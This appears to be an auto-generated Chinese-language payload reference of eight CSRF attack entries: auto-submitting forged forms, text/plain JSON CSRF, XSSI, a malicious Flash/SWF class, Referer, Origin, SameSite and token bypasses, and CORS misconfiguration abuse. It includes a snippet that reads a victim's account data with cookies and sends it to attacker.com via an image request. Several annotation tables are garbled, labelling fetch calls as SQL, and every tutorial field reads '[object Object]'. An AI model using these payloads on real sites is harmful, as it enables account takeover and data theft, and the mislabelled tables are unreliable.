# CSRF跨站请求伪造 — Web 攻击 payload

> 来源：src-hunter `references/payloader/raw/web.json`（8 条）
> 本文件由 `scripts/build-src-hunter-payloader.mjs` 从结构化 JSON 生成；上游同名 `.md` 为乱码，已弃用。

---
### 1. CSRF基础攻击

- **id:** `csrf-basic`
- **分类:** CSRF跨站请求伪造 / 基础攻击
- **tags:** `csrf` `cross-site` `request` `forgery`

跨站请求伪造基础攻击技术

**前置条件**

- 目标存在敏感操作
- 缺少CSRF保护

**利用步骤**

#### 1. 构造CSRF表单

```
<form action="http://target.com/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked123">
  <input type="hidden" name="confirm_password" value="hacked123">
  <input type="submit" value="Click me">
</form>
<script>document.forms[0].submit();</script>
```

构造自动提交的CSRF表单

| 片段 | 说明 | 类型 |
|---|---|---|
| `action` | 目标URL | value |
| `hidden` | 隐藏字段 | value |
| `submit()` | 自动提交表单 | function |

#### 2. GET请求CSRF

```
<img src="http://target.com/delete?id=123" style="display:none">
或直接诱导用户点击:
http://target.com/delete?id=123
```

GET请求的CSRF攻击

| 片段 | 说明 | 类型 |
|---|---|---|
| `<img src>` | 图片标签自动请求 | tag |

#### 3. JSON CSRF

```
<script>
fetch("http://target.com/api/change-email", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: JSON.stringify({email: "attacker@evil.com"})
});
</script>
```

JSON格式的CSRF攻击

| 片段 | 说明 | 类型 |
|---|---|---|
| `credentials: "include"` | 包含Cookie | value |
| `text/plain` | 绕过预检请求 | value |

#### 4. 链接诱导

```
<a href="http://target.com/action?param=value">点击领取红包</a>
或短链接隐藏真实URL
```

诱导用户点击

| 片段 | 说明 | 类型 |
|---|---|---|
| `<a` | 命令/关键字 | command |

**WAF 绕过**

#### Referer绕过

```
使用Referrer Policy:
<meta name="referrer" content="no-referrer">
或使用data URL:
<data:text/html;base64,CSRF_PAYLOAD>
或使用HTTPS->HTTP降级
```

绕过Referer检查

| 片段 | 说明 | 类型 |
|---|---|---|
| `no-referrer` | 不发送Referer头 | value |

#### Token绕过

```
1. 检查Token是否可预测
2. 检查Token是否绑定会话
3. 检查Token是否在GET参数中泄露
4. 检查是否有Token重放漏洞
```

绕过Token验证

| 片段 | 说明 | 类型 |
|---|---|---|
| `1.` | 命令/载荷起始 | command |
| ` 检查Token是否可预测 2. 检查Token是否绑定会话 3. 检查Token是否在GET参数中泄露 4. 检查是否有Token重放漏洞` | 参数与载荷内容 | value |

**教程**

[object Object]

---

### 2. JSON CSRF攻击

- **id:** `csrf-json`
- **分类:** CSRF跨站请求伪造 / JSON CSRF
- **tags:** `csrf` `json` `api` `post`

针对JSON请求的CSRF攻击技术

**前置条件**

- 目标使用JSON格式请求
- 缺少CSRF保护
- CORS配置不当

**利用步骤**

#### 1. 简单JSON CSRF

```
<script>
fetch("http://target.com/api/update", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: JSON.stringify({email: "attacker@evil.com"})
});
</script>
```

使用text/plain绕过预检

| 片段 | 说明 | 类型 |
|---|---|---|
| `fetch()` | 发起HTTP请求 | function |
| `credentials: "include"` | 包含Cookie | value |
| `text/plain` | 绕过CORS预检 | value |

#### 2. Flash JSON CSRF

```
# 使用Flash发送JSON请求
# 需要目标允许Content-Type: application/json
# 配合Flash的跨域能力
```

使用Flash发送JSON

| 片段 | 说明 | 类型 |
|---|---|---|
| `Content-Type` | 内容类型头 | header |

#### 3. XSSI攻击

```
# 利用JSONP回调
<script src="http://target.com/api/data?callback=attacker"></script>
function attacker(data) { console.log(data); }

# 利用数组返回
[{"secret": "data"}]
<script>var data = [{"secret": "data"}];</script>
```

跨站脚本包含攻击

| 片段 | 说明 | 类型 |
|---|---|---|
| `JSONP` | JSON with Padding | value |
| `callback` | 回调函数名 | value |

#### 4. SWF文件攻击

```
# 创建恶意SWF文件发送JSON请求
# 编译ActionScript代码
# 嵌入HTML页面
```

使用SWF文件

**WAF 绕过**

#### 修改Content-Type

```
# 尝试不同的Content-Type
text/plain
application/x-www-form-urlencoded
application/x-www-form-urlencoded; charset=UTF-8
```

修改Content-Type绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` 尝试不同的Content-Type text/plain application/x-www-form-urlencoded application/x-www-form-urlencoded; charset=UTF-8` | 参数与载荷内容 | value |

#### 使用FormData

```
let formData = new FormData();
formData.append("data", JSON.stringify({email: "attacker@evil.com"}));
fetch(url, {method: "POST", body: formData, credentials: "include"});
```

使用FormData发送

| 片段 | 说明 | 类型 |
|---|---|---|
| `fetch()` | 网络请求 | function |

**教程**

[object Object]

---

### 3. CSRF绕过技术

- **id:** `csrf-bypass`
- **分类:** CSRF跨站请求伪造 / 绕过技术
- **tags:** `csrf` `bypass` `token` `referer`

绕过CSRF防护的各种技术

**前置条件**

- 目标存在CSRF防护
- 防护机制存在缺陷

**利用步骤**

#### 1. Token验证绕过

```
# Token可预测
分析Token生成规律，预测有效Token

# Token未绑定会话
使用其他用户的Token

# Token重用
同一个Token可多次使用

# Token在GET参数中泄露
从页面源码获取Token
```

绕过Token验证

| 片段 | 说明 | 类型 |
|---|---|---|
| `Token可预测` | Token有规律可循 | value |
| `Token未绑定` | Token与会话无关 | value |

#### 2. Referer验证绕过

```
# 正则匹配不严谨
Referer: http://attacker.com/target.com/
Referer: http://target.com.attacker.com/

# 空Referer
<meta name="referrer" content="no-referrer">

# HTTPS->HTTP降级
从HTTPS站点跳转到HTTP不发送Referer
```

绕过Referer验证

| 片段 | 说明 | 类型 |
|---|---|---|
| `正则绕过` | 利用正则匹配缺陷 | value |
| `no-referrer` | 不发送Referer | value |

#### 3. Origin验证绕过

```
# Origin为null
使用data URL或about:blank

# 正则绕过
Origin: http://target.com.attacker.com
Origin: http://attacktarget.com

# IE11不发送Origin
IE11在某些情况下不发送Origin头
```

绕过Origin验证

#### 4. SameSite绕过

```
# SameSite=Lax
GET请求会发送Cookie
构造GET形式的敏感操作

# SameSite未设置
默认行为可能允许跨站发送

# 两分钟窗口
SameSite=Lax有2分钟窗口期
```

绕过SameSite限制

| 片段 | 说明 | 类型 |
|---|---|---|
| `SameSite=Lax` | GET请求允许Cookie | value |
| `2分钟窗口` | Lax模式的宽限期 | value |

**WAF 绕过**

#### CORS配置错误

```
# Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# Access-Control-Allow-Origin: *
允许任意源

# 反射Origin
Access-Control-Allow-Origin: [任意Origin]
```

利用CORS配置错误

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` Access-Control-Allow-Origin: null Access-Control-Allow-Credentials: true  # Access-Control-Allow-Origin: * 允许任意源  # 反射Origin Access-Control-Allow-Origin: [任意Origin]` | 参数与载荷内容 | value |

**教程**

[object Object]

---

### 4. SameSite绕过技术

- **id:** `csrf-samesite`
- **分类:** CSRF跨站请求伪造 / SameSite绕过
- **tags:** `csrf` `samesite` `cookie` `bypass`

绕过SameSite Cookie属性的CSRF攻击

**前置条件**

- Cookie设置了SameSite属性
- SameSite配置存在缺陷

**利用步骤**

#### 1. SameSite=Lax绕过

```
# GET请求绕过
构造GET形式的敏感操作
<img src="http://target.com/delete?id=123">

# 顶级导航
<a href="http://target.com/action">点击</a>
window.location = "http://target.com/action"

# 两分钟窗口
在用户交互后2分钟内发起请求
```

绕过SameSite=Lax

| 片段 | 说明 | 类型 |
|---|---|---|
| `GET请求` | Lax允许GET携带Cookie | value |
| `顶级导航` | Lax允许顶级导航 | value |
| `2分钟窗口` | 用户交互后的宽限期 | value |

#### 2. SameSite=Strict绕过

```
# 子域名攻击
从子域名发起请求
http://sub.target.com/attack

# Cookie覆盖
设置同名Cookie覆盖
Set-Cookie: session=attacker; Domain=.target.com

# 利用重定向
从目标站点重定向到攻击页面
```

绕过SameSite=Strict

#### 3. 未设置SameSite

```
# 旧浏览器默认行为
Chrome < 80 默认None
Safari 默认None

# 可直接发起CSRF攻击
无需特殊绕过
```

利用未设置SameSite

#### 4. 利用OAuth流程

```
# OAuth回调绕过SameSite
1. 发起OAuth登录
2. 在回调中注入恶意请求
3. Cookie在OAuth流程中发送
```

利用OAuth流程

**WAF 绕过**

#### 混合内容

```
# HTTPS->HTTP降级
从HTTPS站点发起HTTP请求
某些情况下不发送SameSite
```

利用混合内容

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` HTTPS->HTTP降级 从HTTPS站点发起HTTP请求 某些情况下不发送SameSite` | 参数与载荷内容 | value |

#### 客户端重定向

```
# JavaScript重定向
location.href = "http://target.com/action"
可能绕过某些SameSite检查
```

客户端重定向

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` JavaScript重定向 location.href = "http://target.com/action" 可能绕过某些SameSite检查` | 参数与载荷内容 | value |

**教程**

[object Object]

---

### 5. Token绕过技术

- **id:** `csrf-token-bypass`
- **分类:** CSRF跨站请求伪造 / Token绕过
- **tags:** `csrf` `token` `bypass` `predictable`

绕过CSRF Token验证的技术

**前置条件**

- 目标使用CSRF Token
- Token机制存在缺陷

**利用步骤**

#### 1. Token可预测

```
# 分析Token生成规律
# 常见弱Token模式:
- 时间戳
- 递增数字
- 用户ID哈希
- 弱随机数

# 预测并构造有效Token
```

预测Token值

| 片段 | 说明 | 类型 |
|---|---|---|
| `时间戳` | 基于时间的Token | value |
| `递增数字` | 可预测的序列 | value |

#### 2. Token未绑定会话

```
# Token不验证会话
# 攻击步骤:
1. 攻击者获取自己的Token
2. 使用该Token构造CSRF
3. 诱使受害者提交

# Token可跨用户使用
```

利用未绑定Token

#### 3. Token泄露

```
# Token在URL中泄露
http://target.com/page?token=xxx

# Token在Referer中泄露
从包含Token的页面跳转

# Token在日志中泄露
服务器日志记录Token
```

利用Token泄露

| 片段 | 说明 | 类型 |
|---|---|---|
| `URL泄露` | Token出现在URL中 | value |
| `Referer泄露` | 通过Referer头泄露 | value |

#### 4. Token重放

```
# Token可重复使用
# 攻击步骤:
1. 获取有效Token
2. 多次使用同一Token
3. Token不过期或不失效
```

Token重放攻击

#### 5. Token删除绕过

```
# 尝试删除Token参数
POST /action HTTP/1.1
# 不发送Token参数

# 尝试空Token
POST /action?token=

# 尝试删除Token头
```

删除Token绕过

**WAF 绕过**

#### 方法覆盖

```
# 使用_method参数
POST /action?_method=PUT&token=xxx

# 使用X-HTTP-Method-Override
X-HTTP-Method-Override: PUT
```

方法覆盖绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` 使用_method参数 POST /action?_method=PUT&token=xxx  # 使用X-HTTP-Method-Override X-HTTP-Method-Override: PUT` | 参数与载荷内容 | value |

#### JSON格式

```
# 使用JSON格式提交
Content-Type: application/json
{"token": "xxx", "action": "delete"}

# 可能绕过Token验证
```

JSON格式绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 使用JSON格式提交 Content-Type: application/json {"token": "xxx", "action": "` | SQL表达式 | value |
| `delete` | SQL关键字 | keyword |
| `"}  # 可能绕过Token验证` | SQL表达式 | value |

**教程**

[object Object]

---

### 6. Referer绕过技术

- **id:** `csrf-referer-bypass`
- **分类:** CSRF跨站请求伪造 / Referer绕过
- **tags:** `csrf` `referer` `bypass` `header`

绕过Referer验证的CSRF攻击

**前置条件**

- 目标验证Referer头
- 验证逻辑存在缺陷

**利用步骤**

#### 1. 正则匹配绕过

```
# 正则只检查包含
Referer: http://attacker.com/target.com/
Referer: http://target.com.attacker.com/
Referer: http://attacktarget.com/

# 正则只检查开头
Referer: http://target.com.attacker.com/

# 正则只检查结尾
Referer: http://attacker.com/target.com
```

利用正则匹配缺陷

| 片段 | 说明 | 类型 |
|---|---|---|
| `包含匹配` | 只检查是否包含域名 | value |
| `开头匹配` | 只检查开头 | value |
| `结尾匹配` | 只检查结尾 | value |

#### 2. 空Referer绕过

```
# 不发送Referer
<meta name="referrer" content="no-referrer">

# data URL
data:text/html,<script>CSRF</script>

# about:blank
about:blank

# HTTPS->HTTP降级
从HTTPS站点跳转到HTTP
```

发送空Referer

| 片段 | 说明 | 类型 |
|---|---|---|
| `no-referrer` | 浏览器不发送Referer | value |
| `data URL` | data协议无源 | value |

#### 3. 子域名绕过

```
# 从子域名发起
Referer: http://sub.target.com/attack

# 从兄弟域名发起
Referer: http://sibling.target.com/

# 利用子域名XSS
在子域名注入XSS发起CSRF
```

利用子域名

#### 4. Referrer-Policy利用

```
# origin-only
<meta name="referrer" content="origin">
Referer: http://target.com

# origin-when-cross-origin
<meta name="referrer" content="origin-when-cross-origin">
```

利用Referrer-Policy

**WAF 绕过**

#### iframe嵌入

```
# 使用iframe嵌入目标
<iframe src="http://target.com" referrerpolicy="no-referrer">

# sandbox属性
<iframe sandbox="allow-scripts" src="...">
```

iframe绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` 使用iframe嵌入目标 <iframe src="http://target.com" referrerpolicy="no-referrer">  # sandbox属性 <iframe sandbox="allow-scripts" src="...">` | 参数与载荷内容 | value |

#### Flash/SWF

```
# Flash可以控制Referer
# 编译SWF发送自定义Referer
```

Flash控制Referer

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` Flash可以控制Referer # 编译SWF发送自定义Referer` | 参数与载荷内容 | value |

**教程**

[object Object]

---

### 7. Flash CSRF攻击

- **id:** `csrf-flash`
- **分类:** CSRF跨站请求伪造 / Flash CSRF
- **tags:** `csrf` `flash` `swf` `crossdomain`

利用Flash进行CSRF攻击

**前置条件**

- 目标允许Flash请求
- crossdomain.xml配置不当

**利用步骤**

#### 1. crossdomain.xml利用

```
# 检查crossdomain.xml
http://target.com/crossdomain.xml

# 允许所有域
<cross-domain-policy>
<allow-access-from domain="*"/>
</cross-domain-policy>

# 允许特定域
<allow-access-from domain="*.target.com"/>
```

检查跨域策略文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `crossdomain.xml` | Flash跨域策略文件 | path |
| `allow-access-from` | 允许访问的域 | value |

#### 2. 创建恶意SWF

```
// ActionScript代码
package {
  import flash.net.*;
  public class CSRF {
    public function CSRF() {
      var req:URLRequest = new URLRequest("http://target.com/api/action");
      req.method = URLRequestMethod.POST;
      req.data = "param=value";
      req.requestHeaders.push(new URLRequestHeader("Content-Type", "application/json"));
      sendToURL(req);
    }
  }
}
```

创建恶意Flash文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `URLRequest` | Flash HTTP请求类 | value |
| `sendToURL` | 发送请求 | value |

#### 3. 发送JSON请求

```
// Flash可以发送任意Content-Type
req.requestHeaders.push(
  new URLRequestHeader("Content-Type", "application/json")
);
req.data = JSON.stringify({email: "attacker@evil.com"});
```

发送JSON格式请求

| 片段 | 说明 | 类型 |
|---|---|---|
| `Content-Type` | 内容类型头 | header |

#### 4. 自定义Header

```
// Flash可以添加自定义Header
req.requestHeaders.push(
  new URLRequestHeader("X-Custom-Header", "value")
);

// 绕过某些Header验证
```

添加自定义Header

| 片段 | 说明 | 类型 |
|---|---|---|
| `//` | 命令/关键字 | command |

**WAF 绕过**

#### 绕过预检请求

```
# Flash可以绕过CORS预检
# 直接发送POST请求
# 携带Cookie
```

绕过CORS预检

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` Flash可以绕过CORS预检 # 直接发送POST请求 # 携带Cookie` | 参数与载荷内容 | value |

**教程**

[object Object]

---

### 8. CORS配置错误利用

- **id:** `csrf-cors`
- **分类:** CSRF跨站请求伪造 / CORS配置错误
- **tags:** `csrf` `cors` `misconfiguration` `api`

利用CORS配置错误进行CSRF攻击

**前置条件**

- CORS配置错误
- 允许跨域携带凭证

**利用步骤**

#### 1. 检测CORS配置

```
# 发送测试请求
curl -H "Origin: http://attacker.com" http://target.com/api

# 检查响应头
Access-Control-Allow-Origin: http://attacker.com
Access-Control-Allow-Credentials: true

# 危险配置
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

检测CORS配置

| 片段 | 说明 | 类型 |
|---|---|---|
| `Access-Control-Allow-Origin` | 允许的源 | value |
| `Access-Control-Allow-Credentials` | 允许携带凭证 | value |

#### 2. 反射Origin攻击

```
# 服务器反射任意Origin
Access-Control-Allow-Origin: [请求的Origin]
Access-Control-Allow-Credentials: true

# 攻击代码
fetch("http://target.com/api/sensitive", {
  credentials: "include"
})
.then(r => r.json())
.then(data => sendToAttacker(data));
```

利用反射Origin

| 片段 | 说明 | 类型 |
|---|---|---|
| `fetch()` | 网络请求 | function |

#### 3. null源攻击

```
# 允许null源
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# 使用data URL
<iframe src="data:text/html,<script>
fetch('http://target.com/api', {credentials: 'include'})
.then(r => r.json()).then(sendToAttacker);
</script>"></iframe>
```

利用null源

| 片段 | 说明 | 类型 |
|---|---|---|
| `null` | data URL的Origin为null | keyword |

#### 4. 正则绕过

```
# 正则匹配不严谨
允许: target.com
绕过: attacktarget.com
target.com.attacker.com

# 攻击代码
fetch("http://target.com.api.attacker.com/api", {
  credentials: "include"
});
```

正则匹配绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `fetch()` | 网络请求 | function |

**WAF 绕过**

#### 窃取敏感数据

```
# 利用CORS窃取数据
fetch("http://target.com/api/user", {
  credentials: "include"
})
.then(r => r.json())
.then(data => {
  new Image().src = "http://attacker.com/log?data=" + encodeURIComponent(JSON.stringify(data));
});
```

窃取用户数据

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 利用CORS窃取数据 fetch("http://target.com/api/user", {   credentials: "include" }` | 攻击载荷 | value |

#### 执行敏感操作

```
# 利用CORS执行操作
fetch("http://target.com/api/delete", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({id: 123})
});
```

执行敏感操作

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 利用CORS执行操作 fetch("http://target.com/api/` | SQL表达式 | value |
| `delete` | SQL关键字 | keyword |
| `", {   method: "POST",   credentials: "include",   headers: {"Content-Type": "application/json"},   body: JSON.stringify({id: 123}) });` | SQL表达式 | value |

**教程**

[object Object]
